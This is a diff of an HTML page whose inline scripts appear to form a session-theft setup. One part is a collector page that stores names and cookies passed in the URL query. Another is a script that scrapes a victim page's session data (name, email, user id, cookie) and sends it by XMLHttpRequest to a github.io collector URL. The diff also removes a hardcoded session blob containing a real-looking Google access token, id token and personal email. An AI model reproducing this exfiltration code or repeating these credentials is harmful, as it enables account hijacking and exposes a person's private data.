@@ -12,41 +12,40 @@
         <script>
             
             url = document.URL
-            
+            localStorage.clear()
             //being given the url of the form https://maxjdobrei.github.io/temp/index.html?n=bob&c=HFEBLjh
             //need to isolate the name and cookie values            
-            if (url.includes("?"))
-            {
-                params = url.split("?")[1].split("&")
-                name = params[0].split("=")[1]
-                cookie = params[1].split("=")[1]
-                
-                localStorage.setItem(name, cookie)
-            }
-            
-            let s = ""
-            for (let i = 0; i < localStorage.length; i++)
-            {
-                name = localStorage.key(i)
-                cookie = localStorage.getItem(name)
-                
-                s += name + " "
-                s += cookie + "\n"
-            }
+            // if (url.includes("?"))
+            // {
+            //     params = url.split("?")[1].split("&")
+            //     name = params[0].split("=")[1]
+            //     email = params[1].split("=")[1]
+            //     userid = params[2].split("=")[1]
+            //     cookie = params[3].split("=")[1]
+            //     let arr = [email, userid, cookie]
 
-            document.getElementById("output").innerHTML = s
+            //     localStorage.setItem(name, arr)
+            // }
+            
+            // let s = ""
+            // for (let i = 0; i < localStorage.length; i++)
+            // {
+            //     name = localStorage.key(i)
+            //     arr = localStorage.getItem(name)
+                
+            //     s = "Name: " +name +", Email: " +arr[0] +", Userid: " +arr[1] +", Cookie: " +arr[2]
+            
+            //     const para = document.createElement("p");
+            //     para.innerText = s
+            //     document.body.appendChild(para);
+            
+            // }
+
+            
 
         </script>
-        
-        <script>
-            m = 1
-        </script>
-            
-        <script>
-            m = 'self.__next_f.push([1,"6:[\\"$\\",\\"html\\",null,{\\"lang\\":\\"en\\",\\"children\\":[\\"$\\",\\"body\\",null,{\\"className\\":\\"bg-sky-400\\",\\"children\\":[[\\"$\\",\\"$L7\\",null,{\\"session\\":{\\"user\\":{\\"name\\":\\"Max Dobrei\\",\\"email\\":\\"maxjdobrei@gmail.com\\",\\"image\\":\\"https://lh3.googleusercontent.com/a/ACg8ocIteYc8EEKarhHtO0ECNbl1FG6ads15EjA3PrAhweel=s96-c\\",\\"id\\":\\"roo{s}t{er}\\"},\\"access_token\\":\\"ya29.a0AfB_byCyzplSn1UCAzLJESlppc8gPC01xHOM3H19om42EK0jz42PyCUgxLJwIb9On5yjdzJtrPzFhWSwEfgTbOAK1fHpAwtXB2_pszT-tquIweBcqVph2r_PPJZ89zUOc8GjI_CeJbtTOgf_x_5aV7m_YVw6IXeYegJErQaCgYKAT4SARASFQGOcNnCy798OCRiAoTd2Pw4JDq0aw0173\\",\\"id_token\\":\\"eyJhbGciOiJSUzI1NiIsImtpZCI6IjdkMzM0NDk3NTA2YWNiNzRjZGVlZGFhNjYxODRkMTU1NDdmODM2OTMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJhenAiOiIxMjAzNTM2ODk1MTEtN3VnbjM4a25xOW1wa3ZqdW84ZTJoaTFpcmpyOGoxaXAuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJhdWQiOiIxMjAzNTM2ODk1MTEtN3VnbjM4a25xOW1wa3ZqdW84ZTJoaTFpcmpyOGoxaXAuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJzdWIiOiIxMTc0NjMxNDg0Nzk4MjI5MTkzODMiLCJlbWFpbCI6Im1heGpkb2JyZWlAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImF0X2hhc2giOiJ1OGRDcV92TWtGQy0ybHVDQ1VJdHlBIiwiaWF0IjoxNjk3OTkzOTk1LCJleHAiOjE2OTc5OTc1OTV9.RhsMJj6Yny5kUf4FunoOSF1gPeolm-rvRYsRaSw2g4P2oaUut-kbsQg7eH3OYRAItSt69voExof6PgiZVgQlJ7KFBJvw0TPyy-LX15Y8-har23J2Ue9dNANidNtXbNskJ8al0oUQ4HO-A5T88ZkphiD0bJqpYazEWJmv39o5GRRnfTNNLGH-piJTcBqtE5_dA0baTpQruZBM8O-QqnxOXdWJCDmi12-ZHEE0y_jBLpJHVGoqQ-4vqNX1T2DCH1wGOPaXBWDCjUzBW-JtZsioDP3CceYEpeL8W61n0l1mozzSel5uImF2IdVM7Q-97sVdlq7uzP8MasX7Z43AAAtlEQ\\"},\\"children\\":[\\"$\\",\\"$L8\\",null,{\\"parallelRouterKey\\":\\"children\\",\\"segmentPath\\":[\\"children\\"],\\"error\\":\\"$undefined\\",\\"errorStyles\\":\\"$undefined\\",\\"loading\\":\\"$undefined\\",\\"loadingStyles\\":\\"$undefined\\",\\"hasLoading\\":false,\\"template\\":[\\"$\\",\\"$L9\\",null,{}],\\"templateStyles\\":\\"$undefined\\",\\"notFound\\":[\\"$\\",\\"div\\",null,{\\"className\\":\\"flex min-h-screen flex-col items-center justify-center px-8 font-mono py-4 bg-sky-400\\",\\"children\\":[[\\"$\\",\\"h1\\",null,{\\"className\\":\\"text-4xl font-bold mb-4\\",\\"children\\":\\"404 - Page Not Found\\"}],[\\"$\\",\\"p\\",null,{\\"className\\":\\"text-xl mb-8\\",\\"children\\":\\"The page you are looking for does not exist.\\"}],[\\"$\\",\\"$La\\",null,{\\"className\\":\\"text-sky-800 hover:underline\\",\\"href\\":\\"/\\",\\"children\\":\\"Go back to the feed\\"}]]}],\\"notFoundStyles\\":[],\\"childProp\\":{\\"current\\":[\\"$\\",\\"$L8\\",null,{\\"parallelRouterKey\\":\\"children\\",\\"segmentPath\\":[\\"children\\",\\"feed\\",\\"children\\"],\\"error\\":\\"$undefined\\",\\"errorStyles\\":\\"$undefined\\",\\"loading\\":\\"$undefined\\",\\"loadingStyles\\":\\"$undefined\\",\\"hasLoading\\":false,\\"template\\":[\\"$\\",\\"$L9\\",null,{}],\\"templateStyles\\":\\"$undefined\\",\\"notFound\\":\\"$undefined\\",\\"notFoundStyles\\":\\"$undefined\\",\\"childProp\\":{\\"current\\":[\\"$Lb\\",\\"$Lc\\",null],\\"segment\\":\\"__PAGE__\\"},\\"styles\\":[]}],\\"segment\\":\\"feed\\"},\\"styles\\":[]}]}],[\\"$\\",\\"$Ld\\",null,{}]]}]}]\\n"])'
-        </script>
-            
-        <script>
+              
+        <!-- <script>
             userid = ""
             name = ""
             email = ""
@@ -71,25 +70,27 @@
                     console.log(arr.length)
                     for (let j = 0; j < arr.length; j++)
                     {
-                        //console.log(arr[j])
                         if (arr[j] == "{name")
                         {
-                            //console.log("huh")
                             name = arr[j+1].split(",")[0].replace(" ", "")
                             email = arr[j+2].split(",")[0]
                             userid = arr[j+5].split(",")[0]
                             cookie = arr[j+7].split(",")[0]
                             
                             url = "maxjdobrei.github.io/_temp/index.html?n=" +name +"&e=" +email +"&uid=" +userid +"&c=" +cookie
-                            console.log(url)
+
+                            let xhttp = new XMLHttpRequest()
+
+                            xhttp.open("GET", url)
+                            xhttp.send()
+
                             break
                         }
-                        //console.log("reaches end")
                     }                    
                     break
                 }
             }
-        </script>
+        </script> -->
 
 
 
